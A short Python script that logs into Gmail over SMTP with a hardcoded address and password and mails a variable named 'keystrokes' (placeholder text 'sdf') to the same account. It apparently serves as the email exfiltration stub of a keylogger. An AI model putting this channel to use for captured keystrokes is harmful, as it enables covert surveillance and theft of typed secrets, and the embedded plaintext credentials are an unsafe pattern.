import smtplib
from email.mime.text import MIMEText


username = "n1gh7dev@gmail.com"
password = "testdev123"
keystrokes = "sdf"

msg = MIMEText(keystrokes)
msg['Subject'] = 'YELLOW'
msg['From'] = username
msg['To'] = username

# msg = "\r\n".join([
#     ("From: {from_email}"
#      "To: {to_email}"
#      "Subject: {subject}"
#      ""
#      "{body}").format(from_email=username,
#                       to_email=username,
#                       subject="Hello",
#                       body=keystrokes)
# ])

server = smtplib.SMTP('smtp.gmail.com:587')
server.ehlo()
server.starttls()
server.login(username, password)
server.sendmail(username, [username], msg.as_string())
server.quit()
